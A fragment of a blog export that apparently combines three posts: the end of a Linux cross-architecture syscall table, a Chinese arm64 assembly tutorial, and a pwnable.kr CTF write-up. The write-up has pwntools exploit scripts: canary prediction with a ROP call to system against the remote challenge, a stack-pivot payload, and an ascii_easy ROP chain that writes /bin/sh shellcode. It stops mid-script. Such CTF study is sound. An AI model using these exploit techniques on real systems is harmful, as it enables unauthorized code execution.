cs/ 0x170 int struct sockaddr * int * - - - 369 sendto man/ cs/ 0x171 int void * size_t unsigned struct sockaddr * int 370 sendmsg man/ cs/ 0x172 int fd struct user_msghdr *msg unsigned flags - - - 371 recvfrom man/ cs/ 0x173 int void * size_t unsigned struct sockaddr * int * 372 recvmsg man/ cs/ 0x174 int fd struct user_msghdr *msg unsigned flags - - - 373 shutdown man/ cs/ 0x175 int int - - - - 374 userfaultfd man/ cs/ 0x176 int flags - - - - - 375 membarrier man/ cs/ 0x177 int cmd int flags - - - - 376 mlock2 man/ cs/ 0x178 unsigned long start size_t len int flags - - - 377 copy_file_range man/ cs/ 0x179 int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 378 preadv2 man/ cs/ 0x17a unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 379 pwritev2 man/ cs/ 0x17b unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 380 pkey_mprotect man/ cs/ 0x17c unsigned long start size_t len unsigned long prot int pkey - - 381 pkey_alloc man/ cs/ 0x17d unsigned long flags unsigned long init_val - - - - 382 pkey_free man/ cs/ 0x17e int pkey - - - - - 383 statx man/ cs/ 0x17f int dfd const char *path unsigned flags unsigned mask struct statx *buffer - 384 arch_prctl man/ cs/ 0x180 ? ? ? ? ? ? Cross-arch NumbersThis shows the syscall numbers for (hopefully) the same syscall name across architectures. Consult the Random Names section for common gotchas. syscall name x86_64 arm arm64 x86 ARM_breakpoint - 983041 - - ARM_cacheflush - 983042 - - ARM_set_tls - 983045 - - ARM_usr26 - 983043 - - ARM_usr32 - 983044 - - _llseek - 140 - 140 _newselect - 142 - 142 _sysctl 156 149 - 149 accept 43 285 202 - accept4 288 366 242 364 access 21 33 - 33 acct 163 51 89 51 add_key 248 309 217 286 adjtimex 159 124 171 124 afs_syscall 183 - - 137 alarm 37 - - 27 arch_prctl 158 - - 384 arm_fadvise64_64 - 270 - - arm_sync_file_range - 341 - - bdflush - 134 - 134 bind 49 282 200 361 bpf 321 386 280 357 break - - - 17 brk 12 45 214 45 capget 125 184 90 184 capset 126 185 91 185 chdir 80 12 49 12 chmod 90 15 - 15 chown 92 182 - 182 chown32 - 212 - 212 chroot 161 61 51 61 clock_adjtime 305 372 266 343 clock_getres 229 264 114 266 clock_gettime 228 263 113 265 clock_nanosleep 230 265 115 267 clock_settime 227 262 112 264 clone 56 120 220 120 close 3 6 57 6 connect 42 283 203 362 copy_file_range 326 391 285 377 creat 85 8 - 8 create_module 174 - - 127 delete_module 176 129 106 129 dup 32 41 23 41 dup2 33 63 - 63 dup3 292 358 24 330 epoll_create 213 250 - 254 epoll_create1 291 357 20 329 epoll_ctl 233 251 21 255 epoll_ctl_old 214 - - - epoll_pwait 281 346 22 319 epoll_wait 232 252 - 256 epoll_wait_old 215 - - - eventfd 284 351 - 323 eventfd2 290 356 19 328 execve 59 11 221 11 execveat 322 387 281 358 exit 60 1 93 1 exit_group 231 248 94 252 faccessat 269 334 48 307 fadvise64 221 - 223 250 fadvise64_64 - - - 272 fallocate 285 352 47 324 fanotify_init 300 367 262 338 fanotify_mark 301 368 263 339 fchdir 81 133 50 133 fchmod 91 94 52 94 fchmodat 268 333 53 306 fchown 93 95 55 95 fchown32 - 207 - 207 fchownat 260 325 54 298 fcntl 72 55 25 55 fcntl64 - 221 - 221 fdatasync 75 148 83 148 fgetxattr 193 231 10 231 finit_module 313 379 273 350 flistxattr 196 234 13 234 flock 73 143 32 143 fork 57 2 - 2 fremovexattr 199 237 16 237 fsetxattr 190 228 7 228 fstat 5 108 80 108 fstat64 - 197 - 197 fstatat64 - 327 - 300 fstatfs 138 100 44 100 fstatfs64 - 267 - 269 fsync 74 118 82 118 ftime - - - 35 ftruncate 77 93 46 93 ftruncate64 - 194 - 194 futex 202 240 98 240 futimesat 261 326 - 299 get_kernel_syms 177 - - 130 get_mempolicy 239 320 236 275 get_robust_list 274 339 100 312 get_thread_area 211 - - 244 getcpu 309 345 168 318 getcwd 79 183 17 183 getdents 78 141 - 141 getdents64 217 217 61 220 getegid 108 50 177 50 getegid32 - 202 - 202 geteuid 107 49 175 49 geteuid32 - 201 - 201 getgid 104 47 176 47 getgid32 - 200 - 200 getgroups 115 80 158 80 getgroups32 - 205 - 205 getitimer 36 105 102 105 getpeername 52 287 205 368 getpgid 121 132 155 132 getpgrp 111 65 - 65 getpid 39 20 172 20 getpmsg 181 - - 188 getppid 110 64 173 64 getpriority 140 96 141 96 getrandom 318 384 278 355 getresgid 120 171 150 171 getresgid32 - 211 - 211 getresuid 118 165 148 165 getresuid32 - 209 - 209 getrlimit 97 - 163 76 getrusage 98 77 165 77 getsid 124 147 156 147 getsockname 51 286 204 367 getsockopt 55 295 209 365 gettid 186 224 178 224 gettimeofday 96 78 169 78 getuid 102 24 174 24 getuid32 - 199 - 199 getxattr 191 229 8 229 gtty - - - 32 idle - - - 112 init_module 175 128 105 128 inotify_add_watch 254 317 27 292 inotify_init 253 316 - 291 inotify_init1 294 360 26 332 inotify_rm_watch 255 318 28 293 io_cancel 210 247 3 249 io_destroy 207 244 1 246 io_getevents 208 245 4 247 io_setup 206 243 0 245 io_submit 209 246 2 248 ioctl 16 54 29 54 ioperm 173 - - 101 iopl 172 - - 110 ioprio_get 252 315 31 290 ioprio_set 251 314 30 289 ipc - - - 117 kcmp 312 378 272 349 kexec_file_load 320 - - - kexec_load 246 347 104 283 keyctl 250 311 219 288 kill 62 37 129 37 lchown 94 16 - 16 lchown32 - 198 - 198 lgetxattr 192 230 9 230 link 86 9 - 9 linkat 265 330 37 303 listen 50 284 201 363 listxattr 194 232 11 232 llistxattr 195 233 12 233 lock - - - 53 lookup_dcookie 212 249 18 253 lremovexattr 198 236 15 236 lseek 8 19 62 19 lsetxattr 189 227 6 227 lstat 6 107 - 107 lstat64 - 196 - 196 madvise 28 220 233 219 mbind 237 319 235 274 membarrier 324 389 283 375 memfd_create 319 385 279 356 migrate_pages 256 - 238 294 mincore 27 219 232 218 mkdir 83 39 - 39 mkdirat 258 323 34 296 mknod 133 14 - 14 mknodat 259 324 33 297 mlock 149 150 228 150 mlock2 325 390 284 376 mlockall 151 152 230 152 mmap 9 - 222 90 mmap2 - 192 - 192 modify_ldt 154 - - 123 mount 165 21 40 21 move_pages 279 344 239 317 mprotect 10 125 226 125 mpx - - - 56 mq_getsetattr 245 279 185 282 mq_notify 244 278 184 281 mq_open 240 274 180 277 mq_timedreceive 243 277 183 280 mq_timedsend 242 276 182 279 mq_unlink 241 275 181 278 mremap 25 163 216 163 msgctl 71 304 187 - msgget 68 303 186 - msgrcv 70 302 188 - msgsnd 69 301 189 - msync 26 144 227 144 munlock 150 151 229 151 munlockall 152 153 231 153 munmap 11 91 215 91 name_to_handle_at 303 370 264 341 nanosleep 35 162 101 162 newfstatat 262 - 79 - nfsservctl 180 169 42 169 nice - 34 - 34 oldfstat - - - 28 oldlstat - - - 84 oldolduname - - - 59 oldstat - - - 18 olduname - - - 109 open 2 5 - 5 open_by_handle_at 304 371 265 342 openat 257 322 56 295 pause 34 29 - 29 pciconfig_iobase - 271 - - pciconfig_read - 272 - - pciconfig_write - 273 - - perf_event_open 298 364 241 336 personality 135 136 92 136 pipe 22 42 - 42 pipe2 293 359 59 331 pivot_root 155 218 41 217 pkey_alloc 330 395 289 381 pkey_free 331 396 290 382 pkey_mprotect 329 394 288 380 poll 7 168 - 168 ppoll 271 336 73 309 prctl 157 172 167 172 pread64 17 180 67 180 preadv 295 361 69 333 preadv2 327 392 286 378 prlimit64 302 369 261 340 process_vm_readv 310 376 270 347 process_vm_writev 311 377 271 348 prof - - - 44 profil - - - 98 pselect6 270 335 72 308 ptrace 101 26 117 26 putpmsg 182 - - 189 pwrite64 18 181 68 181 pwritev 296 362 70 334 pwritev2 328 393 287 379 query_module 178 - - 167 quotactl 179 131 60 131 read 0 3 63 3 readahead 187 225 213 225 readdir - - - 89 readlink 89 85 - 85 readlinkat 267 332 78 305 readv 19 145 65 145 reboot 169 88 142 88 recv - 291 - - recvfrom 45 292 207 371 recvmmsg 299 365 243 337 recvmsg 47 297 212 372 remap_file_pages 216 253 234 257 removexattr 197 235 14 235 rename 82 38 - 38 renameat 264 329 38 302 renameat2 316 382 276 353 request_key 249 310 218 287 restart_syscall 219 0 128 0 rmdir 84 40 - 40 rt_sigaction 13 174 134 174 rt_sigpending 127 176 136 176 rt_sigprocmask 14 175 135 175 rt_sigqueueinfo 129 178 138 178 rt_sigreturn 15 173 139 173 rt_sigsuspend 130 179 133 179 rt_sigtimedwait 128 177 137 177 rt_tgsigqueueinfo 297 363 240 335 sched_get_priority_max 146 159 125 159 sched_get_priority_min 147 160 126 160 sched_getaffinity 204 242 123 242 sched_getattr 315 381 275 352 sched_getparam 143 155 121 155 sched_getscheduler 145 157 120 157 sched_rr_get_interval 148 161 127 161 sched_setaffinity 203 241 122 241 sched_setattr 314 380 274 351 sched_setparam 142 154 118 154 sched_setscheduler 144 156 119 156 sched_yield 24 158 124 158 seccomp 317 383 277 354 security 185 - - - select 23 - - 82 semctl 66 300 191 - semget 64 299 190 - semop 65 298 193 - semtimedop 220 312 192 - send - 289 - - sendfile 40 187 71 187 sendfile64 - 239 - 239 sendmmsg 307 374 269 345 sendmsg 46 296 211 370 sendto 44 290 206 369 set_mempolicy 238 321 237 276 set_robust_list 273 338 99 311 set_thread_area 205 - - 243 set_tid_address 218 256 96 258 setdomainname 171 121 162 121 setfsgid 123 139 152 139 setfsgid32 - 216 - 216 setfsuid 122 138 151 138 setfsuid32 - 215 - 215 setgid 106 46 144 46 setgid32 - 214 - 214 setgroups 116 81 159 81 setgroups32 - 206 - 206 sethostname 170 74 161 74 setitimer 38 104 103 104 setns 308 375 268 346 setpgid 109 57 154 57 setpriority 141 97 140 97 setregid 114 71 143 71 setregid32 - 204 - 204 setresgid 119 170 149 170 setresgid32 - 210 - 210 setresuid 117 164 147 164 setresuid32 - 208 - 208 setreuid 113 70 145 70 setreuid32 - 203 - 203 setrlimit 160 75 164 75 setsid 112 66 157 66 setsockopt 54 294 208 366 settimeofday 164 79 170 79 setuid 105 23 146 23 setuid32 - 213 - 213 setxattr 188 226 5 226 sgetmask - - - 68 shmat 30 305 196 - shmctl 31 308 195 - shmdt 67 306 197 - shmget 29 307 194 - shutdown 48 293 210 373 sigaction - 67 - 67 sigaltstack 131 186 132 186 signal - - - 48 signalfd 282 349 - 321 signalfd4 289 355 74 327 sigpending - 73 - 73 sigprocmask - 126 - 126 sigreturn - 119 - 119 sigsuspend - 72 - 72 socket 41 281 198 359 socketcall - - - 102 socketpair 53 288 199 360 splice 275 340 76 313 ssetmask - - - 69 stat 4 106 - 106 stat64 - 195 - 195 statfs 137 99 43 99 statfs64 - 266 - 268 statx 332 397 291 383 stime - - - 25 stty - - - 31 swapoff 168 115 225 115 swapon 167 87 224 87 symlink 88 83 - 83 symlinkat 266 331 36 304 sync 162 36 81 36 sync_file_range 277 - 84 314 sync_file_range2 - 341 - - syncfs 306 373 267 344 sysfs 139 135 - 135 sysinfo 99 116 179 116 syslog 103 103 116 103 tee 276 342 77 315 tgkill 234 268 131 270 time 201 - - 13 timer_create 222 257 107 259 timer_delete 226 261 111 263 timer_getoverrun 225 260 109 262 timer_gettime 224 259 108 261 timer_settime 223 258 110 260 timerfd_create 283 350 85 322 timerfd_gettime 287 354 87 326 timerfd_settime 286 353 86 325 times 100 43 153 43 tkill 200 238 130 238 truncate 76 92 45 92 truncate64 - 193 - 193 tuxcall 184 - - - ugetrlimit - 191 - 191 ulimit - - - 58 umask 95 60 166 60 umount - - - 22 umount2 166 52 39 52 uname 63 122 160 122 unlink 87 10 - 10 unlinkat 263 328 35 301 unshare 272 337 97 310 uselib 134 86 - 86 userfaultfd 323 388 282 374 ustat 136 62 - 62 utime 132 - - 30 utimensat 280 348 88 320 utimes 235 269 - 271 vfork 58 190 - 190 vhangup 153 111 58 111 vm86 - - - 166 vm86old - - - 113 vmsplice 278 343 75 316 vserver 236 313 - 273 wait4 61 114 260 114 waitid 247 280 95 284 waitpid - - - 7 write 1 4 64 4 writev 20 146 66 146 Powered by Gitiles| Privacy","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"arm64汇编基础","slug":"arm64","date":"2022-01-25T17:37:04.000Z","updated":"2022-03-25T17:39:27.180Z","comments":true,"path":"2022/01/26/arm64/","link":"","permalink":"http://example.com/2022/01/26/arm64/","excerpt":"","text":"arm64 汇编寄存器通用寄存器31 个R0 ~ R30，每个寄存器可以存取一个 64 位大小的数。 当使用 x0 - x30访问时，是一个 64位的数；当使用 w0 - w30访问时，是一个 32 位的数，访问的是寄存器的 低 32 位，如图： 向量寄存器（也可以说是 浮点型寄存器）每个寄存器的大小是 128 位的。 分别可以用Bn Hn Sn Dn Qn的方式来访问不同的位数；如图: 注：word 是 32 位，也就是 4 Byte大小。 Bn：一个 Byte的大小，即 8 位 Hn：half word，即 16 位 Sn：single word，即 32 位 Dn：double word，即 64 位 Qn：quad word，即128 位 特殊寄存器 sp： (Stack Pointer)，栈顶寄存器，用于保存栈顶地址； fp(x29)： (Frame Pointer)为栈基址寄存，用于保存栈底地址； lr(x30)： (Link Register) ，保存调用跳转指令 bl 指令的下一条指令的内存地址； zr(x31)： (Zero Register)，xzr/wzr分别代表 64/32 位，其作用就是 0，写进去代表丢弃结果，读出来是 0； pc：保存将要执行的指令的地址（有操作系统决定其值，不能改写）。 状态寄存器 CPSR CPSR (Current Program Status Register)和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义；而 CPSR 寄存器是按位起作用的，即，每一位都有专门的含义，记录特定的信息；如下图 注： CPSR 寄存器是 32 位的。 CPSR 的 低8位（包括 I、F、T 和 M[4：0]）称为控制位，程序无法修改，除非 CPU 运行于 特权模式 下，程序才能修改控制位。 N、Z、C、V 均为条件码标志位；其内容可被算术或逻辑运算的结果所改变，并且可以决定某条指令是否被执行。 N（Negative）标志：CPSR 的第 31 位是 N，符号标志位；记录相关指令执行后其结果是否为负数，如果为负数，则 N = 1；如果是非负数，则 N = 0。 Z(Zero)标志：CPSR 的第 30 位是 Z，0标志位；记录相关指令执行后，其结果是否为0，如果结果为0，则 Z = 1；如果结果不为0，则 Z = 0。 C(Carry)标志：CPSR 的第 29 位是C，进位标志位； 加法运算：当运算结果产生了 进位 时（无符号数溢出），C = 1，否则 C = 0 ； 减法运算（包括 CMP）： 当运算时产生了 借位 时（无符号数溢出），C = 0，否则 C = 1 。 V(Overflow)标志：CPSR 的第 28` 位是 V，溢出标志位；在进行有符号数运算的时候，如果超过了机器所能标识的范围，称为溢出。 条件码列表 操作码 条件码助记符 标志 含义 0000 EQ Z=1 相等 0001 NE(Not Equal) Z=0 不相等 0010 CS/HS(Carry Set/High or Same) C=1 无符号数大于或等于 0011 CC/LO(Carry Clear/LOwer) C=0 无符号数小于 0100 MI(MInus) N=1 负数 0101 PL(PLus) N=0 正数或零 0110 VS(oVerflow set) V=1 溢出 0111 VC(oVerflow clear) V=0 没有溢出 1000 HI(High) C=1,Z=0 无符号数大于 1001 LS(Lower or Same) C=0,Z=1 无符号数小于或等于 1010 GE(Greater or Equal) N=V 有符号数大于或等于 1011 LT(Less Than) N!=V 有符号数小于 1100 GT(Greater Than) Z=0,N=V 有符号数大于 1101 LE(Less or Equal) Z=1,N!=V 有符号数小于或等于 1110 AL 任何 无条件执行(默认) 1111 NV 任何 从不执行 指令读取在 arm64 架构中，每个指令读取都是 64 位，即 8字节 空间。 arm64 约定（一般来说） x0 ~ x7 分别会存放方法的前 8 个参数；如果参数个数超过了8个，多余的参数会存在栈上，新方法会通过栈来读取。 方法的返回值一般都在 x0 上；如果方法返回值是一个较大的数据结构时，结果会存在 x8 执行的地址上。 常见汇编指令 mov： 将某一寄存器的值复制到另一寄存器（只能用于寄存器与寄存器或者寄存器与常量之间传值，不能用于内存地址），如： 1mov x1, x0 ; 将寄存器 x0 的值复制到寄存器 x1 中 add： 将某一寄存器的值和另一寄存器的值 相加 并将结果保存在另一寄存器中，如： 123add x0, x0, #1 ; 将寄存器 x0 的值和常量 1 相加后保存在寄存器 x0 中 add x0, x1, x2 ; 将寄存器 x1 和 x2 的值相加后保存到寄存器 x0 中 add x0, x1, [x2] ; 将寄存器 x1 的值加上寄存器 x2 的值作为地址，再取该内存地址的内容放入寄存器 x0 中 sub： 将某一寄存器的值和另一寄存器的值 相减 并将结果保存在另一寄存器中，如： 1sub x0, x1, x2 ; 将寄存器 x1 和 x2 的值相减后保存到寄存器 x0 中 mul：将某一寄存器的值和另一个寄存器的值 相乘 并将结果保存在另一寄存器中，如： 1mul x0, x1, x2 ; 将寄存器 x1 和 x2 的值相乘后结果保存到寄存器 x0 中 sdiv：（有符号数，对应 udiv: 无符号数）将某一寄存器的值和另一个寄存器的值 相除 并将结果保存在另一寄存器中，如： 1sdiv x0, x1, x2 ; 将寄存器 x1 和 x2 的值相除后结果保存到寄存器 x0 中 and： 将某一寄存器的值和另一寄存器的值 按位与 并将结果保存到另一寄存器中，如： 1and x0, x0, #0xf ; 将寄存器 x0 的值和常量 0xf 按位与后保存到寄存器 x0 中 orr： 将某一寄存器的值和另一寄存器的值 按位或 并将结果保存到另一寄存器中，如： 1orr x0, x0, #9 ; 将寄存器 x0 的值和常量 9 按位或后保存到寄存器 x0 中 eor： 将某一寄存器的值和另一寄存器的值 按位异或 并将结果保存到另一寄存器中，如： 1eor x0, x0, #0xf ; 将寄存器 x0 的值和常量 0xf 按位异或后保存到寄存器 x0 中 str： (store register) 将寄存器中的值写入到内存中，如： 1str w9, [sp, #0x8] ; 将寄存器 w9 中的值保存到栈内存 [sp + 0x8] 处 strb： (store register byte) 将寄存器中的值写入到内存中（只存储一个字节），如： 1strb w8, [sp, #7] ; 将寄存器 w8 中的低 1 字节的值保存到栈内存 [sp + 7] 处 ldr： (load register) 将内存中的值读取到寄存器中，如： 12345ldr x0, [x1] ; 将寄存器 x1 的值作为地址，取该内存地址的值放入寄存器 x0 中 ldr w8, [sp, #0x8] ; 将栈内存 [sp + 0x8] 处的值读取到 w8 寄存器中 ldr x0, [x1, #4]! ; 将寄存器 x1 的值加上 4 作为内存地址, 取该内存地址的值放入寄存器 x0 中, 然后将寄存器 x1 的值加上 4 放入寄存器 x1 中 ldr x0, [x1], #4 ; 将寄存器 x1 的值作为内存地址，取内该存地址的值放入寄存器 x0 中, 再将寄存器 x1 的值加上 4 放入寄存器 x1 中 ldr x0, [x1, x2] ; 将寄存器 x1 和寄存器 x2 的值相加作为地址，取该内存地址的值放入寄存器 x0 中 ldrsb： (load register byte) 将内存中的值（只读取一个字节）读取到寄存器中，如： 1ldrsb w8, [sp, #7] ; 将栈内存 [sp + 7] 出的 低 1 字节的值读取到寄存器 w8 中 stur：同 str 将寄存器中的值写入到内存中（一般用于 负 地址运算中），如： 1stur w10, [x29, #-0x4] ; 将寄存器 w10 中的值保存到栈内存 [x29 - 0x04] 处 ldur： 同 ldr 将内存中的值读取到寄存器中（一般用于 负 地址运算中），如： 1ldur w8, [x29, #-0x4] ; 将栈内存 [x29 - 0x04] 处的值读取到 w8 寄存器中 stp： 入栈指令（str 的变种指令，可以同时操作两个寄存器），如： 1stp x29, x30, [sp, #0x10] ; 将 x29, x30 的值存入 sp 偏移 16 个字节的位置 ldp： 出栈指令（ldr 的变种指令，可以同时操作两个寄存器），如： 1ldp x29, x30, [sp, #0x10] ; 将 sp 偏移 16 个字节的值取出来，存入寄存器 x29 和寄存器 x30 scvtf： (Signed Convert To Float)带符号 定点数 转换为 浮点数，如： 1scvtf d1, w0 ; 将寄存器 w0 的值(顶点数，转化成 浮点数) 保存到 向量寄存器&#x2F;浮点寄存器 d1 中 fcvtzs：(Float Convert To Zero Signed)浮点数 转化为 定点数 （舍入为0），如： 1fcvtzs w0, s0 ; 将向量寄存器 s0 的值(浮点数，转换成 定点数)保存到寄存器 w0 中 cbz： 和 0 比较（Compare），如果结果为零（Zero）就转移（只能跳到后面的指令），如： 1cbz x8, loc_1800b4530 ; 将寄存器 x8 的值和 0 比较，如果结果为 “0” 则跳转到 ‘loc_1800b4530’ 标签处开始指令 cbnz： 和非 0 比较（Compare），如果结果非零（Non Zero）就转移（只能跳到后面的指令），如： 1cbnz x9, loc_1800b4530 ; 将寄存器 x9 的值和 0 比较，如果结果为 “非 0” 则跳转到 ‘loc_1800b4530’ 标签处开始指令 cmp： 比较指令，相当于 subs，影响程序状态寄存器 CPSR ; cset：比较指令，满足条件，则并置 1，否则置 0 ，如： 12cmp w8, #2 ; 将寄存器 w8 的值和常量 2 进行比较cset w8, gt ; 如果是大于(grater than)，则将寄存器 w8 的值设置为 1，否则设置为 0 LSL： 逻辑左移 LSR： 逻辑右移 ASR： 算术右移 ROR： 循环右移 adrp： 用来定位数据段中的数据用, 因为 aslr 会导致代码及数据的地址随机化, 用 adrp 来根据 pc 做辅助定位 b： （branch）跳转到某地址（无返回）, 不会改变 lr (x30) 寄存器的值；一般是本方法内的跳转，如 while 循环，if else 等 ，如： 1b LBB0_1 ; 直接跳转到标签 ‘LLB0_1’ 处开始执行 bl： 跳转到某地址（有返回），先将下一指令地址（即函数返回地址）保存到寄存器 lr (x30)中，再进行跳转 ；一般用于不同方法直接的调用 ，如： 1bl 0x100cfa754 ; 先将下一指令地址（‘0x100cfa754’ 函数调用后的返回地址）保存到寄存器 ‘lr’ 中，然后再调用 ‘0x100cfa754’ 函数 blr： 跳转到 某寄存器 (的值)指向的地址（有返回），先将下一指令地址（即函数返回地址）保存到寄存器 lr (x30)中，再进行跳转 ；如： 1blr x20 ; 先将下一指令地址（‘x20’指向的函数调用后的返回地址）保存到寄存器 ‘lr’ 中，然后再调用 ‘x20’ 指向的函数 br： 跳转到某寄存器(的值)指向的地址（无返回）, 不会改变 lr (x30) 寄存器的值。 brk: 可以理解为跳转指令特殊的一种。 ret： 子程序（函数调用）返回指令，返回地址已默认保存在寄存器 lr (x30) 中 函数调用 每个函数调用，都会有 入栈 和 出栈 操作。 例子: PushAndPop.c源代码123456#include &lt;stdio.h&gt;void TestPushAndPop()&#123; printf(&quot;Push an Pop !&quot;);&#125; 汇编代码 通过 Xcode “Product——&gt;Perform Action——&gt;Assemble PushAndPop.c“ 查看其对应的汇编代码： 也可以通过 clang 编译成汇编代码： 12345&#x2F;&#x2F; 注意，以下代码将默认生成pc版的汇编指令clang -S PushAndPop.c &#x2F;&#x2F; arm64汇编需要如下命令，指定架构和系统头文件所在的目录，请务必将isysroot的sdk版本修改为对应的 xcode 中存在的版本！clang -S -arch arm64 -isysroot &#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;Developer&#x2F;Platforms&#x2F;iPhoneOS.platform&#x2F;Developer&#x2F;SDKs&#x2F;iPhoneOS11.1.sdk PushAndPop.c 去除一大堆 不相干东西 得到对应汇编代码，如下： 12345678910sub sp, sp, #32 ; 更新栈顶寄存器的值，（可以看出：申请 32 字节占空间作为新用）stp x29, x30, [sp, #16] ; 保存调用该函数前的栈顶寄存器的值和该函数结束返回后下一将执行指令地址值add x29, sp, #16 ; 更新栈底寄存器的值，(可以看出：还剩余 16 字节空间给该函数用)adrp x0, l_.str@PAGE ; 获取 ‘l_.str’ 标签所在的页的地址 add x0, x0, l_.str@PAGEOFF ; 获取 ‘l_.str’ 标签对应页地址的偏移bl _printf ; 调用 ‘printf’ 函数进行打印stur w0, [x29, #-4] ; 将 w0 寄存器的值(&#39;bl&#39; 函数调用的返回值)保存到 [x29 - 4] 的内存地址中ldp x29, x30, [sp, #16] ; 恢复调用该函数之前栈底寄存器的值add sp, sp, #32 ; 恢复调用该函数之前栈顶寄存器的值ret ; 返回 对与上面的汇编代码，分配了 32 自己空间，其中 16 字节是用作 入栈操作，剩下的 16 字节是用于存储临时变量的。 疑问：例子函数命名是没有临时变量，为什么还会需要申请占空间？ 解释：虽然该函数没有临时变量，但是调用 printf 函数后，编译器自动会加上 该函数返回值 的处理，由于 arm64 规定了整数型返回值放在 x0 寄存器里，因此会隐藏有一个局部变量 int return_value; 的声明在，该临时变量占用 4字节空间；又因为 arm64 下对于使用 sp 作为地址基址寻址的时候，必须要 16byte-alignment（对齐），所以申请了 16字节空间作为临时变量使用。具体参见 这里。 其 入栈操作 汇编代码流程解析如下： 其 出栈操作 汇编代码流程解析如下： 注意：对栈的 分配/释放 操作只会对栈指针做加减法, 而不会对栈内存中的内容做任何修改(也不会把释放的栈空间设置为 0)。 ref 123456best one :https:&#x2F;&#x2F;cit.dixie.edu&#x2F;cs&#x2F;2810&#x2F;arm64-assembly.htmliOS开发同学的arm64汇编入门：https:&#x2F;&#x2F;blog.cnbluebox.com&#x2F;blog&#x2F;2017&#x2F;07&#x2F;24&#x2F;arm64-start&#x2F;arm64 架构之入栈&#x2F;出栈操作：https:&#x2F;&#x2F;blog.shenyuanluo.com&#x2F;Arm64PushAndPopStack.html：基于ARM64 的常见汇编命令记录:https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;42486116","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Pwnable_2_Rookiss","slug":"Pwnable_2_Rookiss","date":"2021-10-17T17:24:39.000Z","updated":"2022-03-25T18:02:24.430Z","comments":true,"path":"2021/10/18/Pwnable_2_Rookiss/","link":"","permalink":"http://example.com/2021/10/18/Pwnable_2_Rookiss/","excerpt":"","text":"unlink远程服务器exp 本地ubuntu exp brain fuckdo_brainfuck程序对指针p进行操作，可以基于此进行got表的覆盖 将menset覆盖为gets，将fgets覆盖为system md5 calculator​ canary由于sand()伪随机性导致的泄露，利用此ROP python3 1234567891011121314151617181920212223242526272829303132333435363738394041424344import timeimport ctypesimport base64from pwn import *context.arch = &#x27;i386&#x27;context.log_level = &#x27;debug&#x27;print (int(time.time()))#p = process(&#x27;./hash&#x27;)now = int(time.time())+1p = remote(&#x27;pwnable.kr&#x27;, 9002)print (now)t = process(&#x27;./get_time&#x27;)t.sendline(str(now))v = t.recvline().decode().split(&#x27;,&#x27;)v = [&#x27;0&#x27;, &#x27;0&#x27;] + v[:-1]for i in range(len(v)): v[i] = int(v[i])t.close()p.recvline()captcha = p.recvline().decode().split(&#x27;:&#x27;)[1][1:-1]p.sendline(captcha)canary = int(captcha)-v[6]+v[8]-v[9]-v[4]+v[5]-v[3]-v[7]canary = ctypes.c_uint(canary).valueprint (canary)p.recvline()p.recvline()#gdb.attach(p)payload = b&#x27;&#x27;payload +=b&#x27;A&#x27;*0x200payload += p32(canary)payload += b&#x27;B&#x27;*0xcpayload += p32(0x08048880) # system pltpayload += b&#x27;a&#x27;*4 #The system() function has a feature that takes an argument from a distance of +4Bytes away.Very Important.payload += p32(0x0804B3E0) # g_bufpayload = base64.b64encode(payload)payload += b&#x27;\\x00&#x27;*(0x300-len(payload))payload +=b&#x27;/bin//sh&#x27;p.sendline(payload)p.interactive() simple loginjust like flag says: 1control EBP, control ESP, control EIP, control the world~ 只能控制ebp的情况下: leave指令完成以下内容： mov esp,ebp pop ebp 完成栈帧恢复 此后ret= pop eip成功控制返回地址 12345payload = &#x27;&#x27;payload += p32(0)payload += p32(0x08049284)payload += p32(0x0811EB40)payload = b64encode(payload) optlearn about ulimit ascii_easyROPgadget的进阶用法 1ROPgadget --offset 0x5555e000 --badbytes &quot;00-1f|80-ff&quot; --ropchain --binary libc-2.15.so &gt; out.txt one_gadget主要用来去查找动态链接库里execve(“/bin/sh”, rsp+0x70, environ)函数的地址 one_gadget进阶用法 https://bbs.pediy.com/thread-261112.htm so库加载地址 0x5555e000 思路： 既然给定的so库是可写可执行的，可以利用 ROPgadget拼接write1或write2将shellcode写入so库上指定地址。最后将控制流跳转到该地址执行。 找到符合条件的write2 找到pop edx和xor eax eax 找到用于脏字符处理的gadget 准备工作结束: exp 关键在于脏字符处理 12345678910111213141516171819202122232425262728293031323334353637from pwn import *context.arch &#x3D; &#39;i386&#39;context.log_level &#x3D; &#39;debug&#39;def write_one(addr, c): w &#x3D; &#39;&#39; w +&#x3D; p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret w +&#x3D; p32(addr) # edx w +&#x3D; p32(0x20202020) # edi w +&#x3D; p32(0x55615d44) # pop eax ; cmp eax, 0xfffff001 ; jae 0xb7d55 ; ret if 0x20 &lt;&#x3D; ord(c) &lt;&#x3D;0x7f: w +&#x3D; c + &#39;\\x20\\x20\\x20&#39; # eax elif ord(c) &lt; 0x20: elif ord(c) &gt; 0x7f:&#39;&#39;&#39;for some reason,this wp isn&#39;t complete.You need to complete this part.&#39;&#39;&#39;shellcode &#x3D; &#39;&#39;shellcode +&#x3D; &#39;\\x31\\xd2&#39; # xor edx, edxshellcode +&#x3D; &#39;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69&#39;shellcode +&#x3D; &#39;\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&#39;payload &#x3D; &#39;&#39;payload +&#x3D; &#39;A&#39;*0x20start_addr &#x3D; 0x55606055for i in range(len(shellcode)): payload +&#x3D; write_one(start_addr+i, shellcode[i])payload +&#x3D; p32(start_addr)p &#x3D; process([&#39;.&#x2F;ascii_easy&#39;, payload])p.interactive() tiny_easy程序跳转 argv[0]前四个字节地址，通过设置executable参数，可以自定义argv[0]。进而可以控制返回地址。 executable (str) – Path to the binary to execute. If None, uses argv[0]. Cannot be used with shell. 1234567from pwn 